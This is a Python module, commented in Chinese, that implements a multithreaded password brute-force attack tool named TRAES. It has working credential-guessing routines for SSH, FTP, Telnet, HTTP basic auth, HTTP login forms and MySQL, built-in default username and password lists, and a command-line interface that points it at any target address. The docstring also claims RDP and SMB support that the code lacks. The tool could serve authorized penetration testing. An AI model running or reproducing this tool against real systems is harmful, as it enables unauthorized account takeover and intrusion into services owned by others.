#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TRAES 密码爆破模块

实现多种协议的密码爆破功能，包括：
- SSH密码爆破
- FTP密码爆破
- Telnet密码爆破
- HTTP基础认证爆破
- HTTP表单爆破
- RDP密码爆破
- SMB密码爆破
- MySQL密码爆破

作者: Security Researcher
版本: 1.0.0
"""

import sys
import time
import threading
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional, Dict, Any, Tuple

try:
    import paramiko
    import ftplib
    import telnetlib
    import requests
    import pymysql
    from requests.auth import HTTPBasicAuth
    from loguru import logger
    from colorama import Fore, Style
except ImportError as e:
    print(f"缺少必要的依赖库: {e}")
    print("请运行: pip install paramiko ftplib telnetlib requests pymysql loguru colorama")
    sys.exit(1)

class BruteForceAttack:
    """
    密码爆破攻击类
    
    实现多种协议的密码爆破功能。
    """
    
    def __init__(self, config: Dict[str, Any] = None):
        """
        初始化密码爆破模块
        
        Args:
            config (dict): 配置字典
        """
        self.config = config or {}
        self.bruteforce_config = self.config.get('attack', {}).get('bruteforce', {})
        self.security_config = self.config.get('security', {})
        
        # 爆破参数
        self.max_threads = self.bruteforce_config.get('max_threads', 10)
        self.timeout = self.bruteforce_config.get('timeout', 5)
        self.delay = self.bruteforce_config.get('delay', 0.1)
        self.max_attempts = self.bruteforce_config.get('max_attempts', 1000)
        self.stop_on_success = self.bruteforce_config.get('stop_on_success', True)
        
        # 字典配置
        self.dictionary_config = self.config.get('dictionary', {})
        self.default_usernames = self.dictionary_config.get('usernames', [
            'admin', 'administrator', 'root', 'user', 'guest', 'test',
            'oracle', 'postgres', 'mysql', 'sa', 'operator'
        ])
        self.default_passwords = self.dictionary_config.get('passwords', [
            'password', '123456', 'admin', 'root', 'guest', 'test',
            '12345', 'password123', 'admin123', '1234567890',
            'qwerty', 'abc123', 'Password1', 'welcome'
        ])
        
        # 白名单配置
        self.whitelist_enabled = self.security_config.get('whitelist', {}).get('enabled', True)
        self.whitelist_ips = set(self.security_config.get('whitelist', {}).get('ips', []))
        
        # 内部状态
        self.running = False
        self.success_count = 0
        self.attempt_count = 0
        self.successful_credentials = []
        
        logger.info("密码爆破模块初始化完成")
    
    def is_whitelisted(self, ip: str) -> bool:
        """
        检查IP地址是否在白名单中
        
        Args:
            ip (str): IP地址
            
        Returns:
            bool: 如果在白名单中返回True
        """
        if not self.whitelist_enabled:
            return False
        return ip in self.whitelist_ips
    
    def load_wordlist(self, filename: str) -> List[str]:
        """
        从文件加载字典
        
        Args:
            filename (str): 字典文件路径
            
        Returns:
            list: 字典列表
        """
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.error(f"加载字典文件 {filename} 失败: {e}")
            return []
    
    def ssh_bruteforce(self, target: str, port: int, username: str, password: str) -> bool:
        """
        SSH密码爆破
        
        Args:
            target (str): 目标IP地址
            port (int): SSH端口
            username (str): 用户名
            password (str): 密码
            
        Returns:
            bool: 登录成功返回True
        """
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=target,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False
            )
            
            ssh.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            logger.debug(f"SSH连接错误 {target}:{port} - {e}")
            return False
    
    def ftp_bruteforce(self, target: str, port: int, username: str, password: str) -> bool:
        """
        FTP密码爆破
        
        Args:
            target (str): 目标IP地址
            port (int): FTP端口
            username (str): 用户名
            password (str): 密码
            
        Returns:
            bool: 登录成功返回True
        """
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=self.timeout)
            ftp.login(username, password)
            ftp.quit()
            return True
            
        except ftplib.error_perm:
            return False
        except Exception as e:
            logger.debug(f"FTP连接错误 {target}:{port} - {e}")
            return False
    
    def telnet_bruteforce(self, target: str, port: int, username: str, password: str) -> bool:
        """
        Telnet密码爆破
        
        Args:
            target (str): 目标IP地址
            port (int): Telnet端口
            username (str): 用户名
            password (str): 密码
            
        Returns:
            bool: 登录成功返回True
        """
        try:
            tn = telnetlib.Telnet(target, port, timeout=self.timeout)
            
            # 等待登录提示
            tn.read_until(b"login: ", timeout=self.timeout)
            tn.write(username.encode('ascii') + b"\n")
            
            # 等待密码提示
            tn.read_until(b"Password: ", timeout=self.timeout)
            tn.write(password.encode('ascii') + b"\n")
            
            # 检查登录结果
            result = tn.read_some()
            tn.close()
            
            # 简单的成功判断（可能需要根据具体情况调整）
            if b"$" in result or b"#" in result or b">" in result:
                return True
            return False
            
        except Exception as e:
            logger.debug(f"Telnet连接错误 {target}:{port} - {e}")
            return False
    
    def http_basic_bruteforce(self, target: str, port: int, path: str,
                             username: str, password: str) -> bool:
        """
        HTTP基础认证爆破
        
        Args:
            target (str): 目标IP地址
            port (int): HTTP端口
            path (str): 路径
            username (str): 用户名
            password (str): 密码
            
        Returns:
            bool: 认证成功返回True
        """
        try:
            url = f"http://{target}:{port}{path}"
            response = requests.get(
                url,
                auth=HTTPBasicAuth(username, password),
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # HTTP 200表示认证成功
            return response.status_code == 200
            
        except Exception as e:
            logger.debug(f"HTTP请求错误 {target}:{port} - {e}")
            return False
    
    def http_form_bruteforce(self, target: str, port: int, path: str,
                           username_field: str, password_field: str,
                           username: str, password: str,
                           success_indicator: str = None) -> bool:
        """
        HTTP表单爆破
        
        Args:
            target (str): 目标IP地址
            port (int): HTTP端口
            path (str): 登录表单路径
            username_field (str): 用户名字段名
            password_field (str): 密码字段名
            username (str): 用户名
            password (str): 密码
            success_indicator (str): 成功登录的指示字符串
            
        Returns:
            bool: 登录成功返回True
        """
        try:
            url = f"http://{target}:{port}{path}"
            data = {
                username_field: username,
                password_field: password
            }
            
            response = requests.post(
                url,
                data=data,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # 根据成功指示器判断
            if success_indicator:
                return success_indicator in response.text
            else:
                # 默认判断：302重定向或200状态码
                return response.status_code in [200, 302]
                
        except Exception as e:
            logger.debug(f"HTTP表单请求错误 {target}:{port} - {e}")
            return False
    
    def mysql_bruteforce(self, target: str, port: int, username: str, password: str) -> bool:
        """
        MySQL密码爆破
        
        Args:
            target (str): 目标IP地址
            port (int): MySQL端口
            username (str): 用户名
            password (str): 密码
            
        Returns:
            bool: 连接成功返回True
        """
        try:
            connection = pymysql.connect(
                host=target,
                port=port,
                user=username,
                password=password,
                connect_timeout=self.timeout
            )
            connection.close()
            return True
            
        except pymysql.Error:
            return False
        except Exception as e:
            logger.debug(f"MySQL连接错误 {target}:{port} - {e}")
            return False
    
    def attempt_login(self, protocol: str, target: str, port: int,
                     username: str, password: str, **kwargs) -> Tuple[bool, str, str]:
        """
        尝试登录
        
        Args:
            protocol (str): 协议类型
            target (str): 目标IP地址
            port (int): 端口
            username (str): 用户名
            password (str): 密码
            **kwargs: 其他参数
            
        Returns:
            tuple: (成功标志, 用户名, 密码)
        """
        if not self.running:
            return False, username, password
        
        self.attempt_count += 1
        
        try:
            success = False
            
            if protocol.lower() == 'ssh':
                success = self.ssh_bruteforce(target, port, username, password)
            elif protocol.lower() == 'ftp':
                success = self.ftp_bruteforce(target, port, username, password)
            elif protocol.lower() == 'telnet':
                success = self.telnet_bruteforce(target, port, username, password)
            elif protocol.lower() == 'http-basic':
                path = kwargs.get('path', '/')
                success = self.http_basic_bruteforce(target, port, path, username, password)
            elif protocol.lower() == 'http-form':
                path = kwargs.get('path', '/login')
                username_field = kwargs.get('username_field', 'username')
                password_field = kwargs.get('password_field', 'password')
                success_indicator = kwargs.get('success_indicator')
                success = self.http_form_bruteforce(
                    target, port, path, username_field, password_field,
                    username, password, success_indicator
                )
            elif protocol.lower() == 'mysql':
                success = self.mysql_bruteforce(target, port, username, password)
            else:
                logger.error(f"不支持的协议: {protocol}")
                return False, username, password
            
            if success:
                self.success_count += 1
                credential = {
                    'protocol': protocol,
                    'target': target,
                    'port': port,
                    'username': username,
                    'password': password
                }
                self.successful_credentials.append(credential)
                
                logger.success(
                    f"[{Fore.GREEN}成功{Style.RESET_ALL}] {protocol}://{target}:{port} - "
                    f"{username}:{password}"
                )
                
                if self.stop_on_success:
                    self.running = False
                
                return True, username, password
            else:
                logger.debug(f"[失败] {protocol}://{target}:{port} - {username}:{password}")
                
        except Exception as e:
            logger.error(f"登录尝试出错: {e}")
        
        # 添加延迟
        if self.delay > 0:
            time.sleep(self.delay)
        
        return False, username, password
    
    def generate_credentials(self, usernames: List[str], passwords: List[str]):
        """
        生成用户名密码组合
        
        Args:
            usernames (list): 用户名列表
            passwords (list): 密码列表
            
        Yields:
            tuple: (用户名, 密码)
        """
        for username, password in itertools.product(usernames, passwords):
            if not self.running:
                break
            if self.attempt_count >= self.max_attempts:
                break
            yield username, password
    
    def run_bruteforce(self, protocol: str, target: str, port: int,
                      usernames: List[str] = None, passwords: List[str] = None,
                      **kwargs):
        """
        运行密码爆破攻击
        
        Args:
            protocol (str): 协议类型
            target (str): 目标IP地址
            port (int): 端口
            usernames (list): 用户名列表
            passwords (list): 密码列表
            **kwargs: 其他参数
        """
        # 检查白名单
        if self.is_whitelisted(target):
            logger.warning(f"目标 {target} 在白名单中，跳过攻击")
            return
        
        if not usernames:
            usernames = self.default_usernames
        if not passwords:
            passwords = self.default_passwords
        
        logger.info(f"开始 {protocol.upper()} 密码爆破攻击")
        logger.info(f"目标: {target}:{port}")
        logger.info(f"用户名数量: {len(usernames)}")
        logger.info(f"密码数量: {len(passwords)}")
        logger.info(f"总组合数: {len(usernames) * len(passwords)}")
        logger.info(f"线程数: {self.max_threads}")
        
        self.running = True
        self.attempt_count = 0
        self.success_count = 0
        self.successful_credentials = []
        
        start_time = time.time()
        
        try:
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                # 提交所有任务
                futures = []
                for username, password in self.generate_credentials(usernames, passwords):
                    if not self.running:
                        break
                    
                    future = executor.submit(
                        self.attempt_login,
                        protocol, target, port, username, password,
                        **kwargs
                    )
                    futures.append(future)
                
                # 处理结果
                for future in as_completed(futures):
                    if not self.running:
                        break
                    
                    try:
                        success, username, password = future.result()
                        
                        # 显示进度
                        if self.attempt_count % 50 == 0:
                            elapsed = time.time() - start_time
                            rate = self.attempt_count / elapsed if elapsed > 0 else 0
                            logger.info(
                                f"进度: {self.attempt_count}/{len(usernames) * len(passwords)} "
                                f"({rate:.1f} 尝试/秒) - 成功: {self.success_count}"
                            )
                        
                        if success and self.stop_on_success:
                            break
                            
                    except Exception as e:
                        logger.error(f"处理结果时出错: {e}")
                
        except KeyboardInterrupt:
            logger.info("收到中断信号，停止攻击")
        except Exception as e:
            logger.error(f"密码爆破过程中出错: {e}")
        finally:
            self.running = False
            
            elapsed = time.time() - start_time
            logger.info(f"密码爆破完成")
            logger.info(f"总尝试次数: {self.attempt_count}")
            logger.info(f"成功次数: {self.success_count}")
            logger.info(f"耗时: {elapsed:.2f} 秒")
            
            if self.successful_credentials:
                print(f"\n{Fore.GREEN}成功的凭据:{Style.RESET_ALL}")
                for i, cred in enumerate(self.successful_credentials, 1):
                    print(f"{i}. {cred['protocol']}://{cred['target']}:{cred['port']} - "
                          f"{cred['username']}:{cred['password']}")
    
    def stop_attack(self):
        """
        停止密码爆破攻击
        """
        logger.info("正在停止密码爆破攻击...")
        self.running = False
    
    def run(self, args):
        """
        运行密码爆破模块
        
        Args:
            args: 命令行参数对象
        """
        if not args.target:
            logger.error("请指定目标IP地址")
            return
        
        if not args.protocol:
            logger.error("请指定协议类型")
            return
        
        try:
            # 加载字典
            usernames = self.default_usernames
            passwords = self.default_passwords
            
            if args.username_list:
                custom_usernames = self.load_wordlist(args.username_list)
                if custom_usernames:
                    usernames = custom_usernames
            
            if args.password_list:
                custom_passwords = self.load_wordlist(args.password_list)
                if custom_passwords:
                    passwords = custom_passwords
            
            if args.username:
                usernames = [args.username]
            
            if args.password:
                passwords = [args.password]
            
            # 设置参数
            if args.threads:
                self.max_threads = args.threads
            if args.timeout:
                self.timeout = args.timeout
            if args.delay:
                self.delay = args.delay
            if args.max_attempts:
                self.max_attempts = args.max_attempts
            
            # 构建额外参数
            kwargs = {}
            if args.path:
                kwargs['path'] = args.path
            if args.username_field:
                kwargs['username_field'] = args.username_field
            if args.password_field:
                kwargs['password_field'] = args.password_field
            if args.success_indicator:
                kwargs['success_indicator'] = args.success_indicator
            
            # 运行爆破
            self.run_bruteforce(
                args.protocol,
                args.target,
                args.port,
                usernames,
                passwords,
                **kwargs
            )
            
        except Exception as e:
            logger.error(f"密码爆破执行失败: {e}")
        finally:
            self.stop_attack()

# 如果直接运行此模块
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="TRAES 密码爆破模块")
    parser.add_argument('--target', '-t', required=True, help='目标IP地址')
    parser.add_argument('--protocol', '-p', required=True,
                       choices=['ssh', 'ftp', 'telnet', 'http-basic', 'http-form', 'mysql'],
                       help='协议类型')
    parser.add_argument('--port', type=int, required=True, help='目标端口')
    parser.add_argument('--username', '-u', help='单个用户名')
    parser.add_argument('--password', help='单个密码')
    parser.add_argument('--username-list', '-U', help='用户名字典文件')
    parser.add_argument('--password-list', '-P', help='密码字典文件')
    parser.add_argument('--threads', type=int, help='线程数')
    parser.add_argument('--timeout', type=int, help='超时时间')
    parser.add_argument('--delay', type=float, help='请求延迟')
    parser.add_argument('--max-attempts', type=int, help='最大尝试次数')
    
    # HTTP特定参数
    parser.add_argument('--path', help='HTTP路径')
    parser.add_argument('--username-field', help='用户名字段名')
    parser.add_argument('--password-field', help='密码字段名')
    parser.add_argument('--success-indicator', help='成功登录指示字符串')
    
    args = parser.parse_args()
    
    # 创建攻击实例
    attack = BruteForceAttack()
    
    try:
        attack.run(args)
    except KeyboardInterrupt:
        print("\n用户中断攻击")
        attack.stop_attack()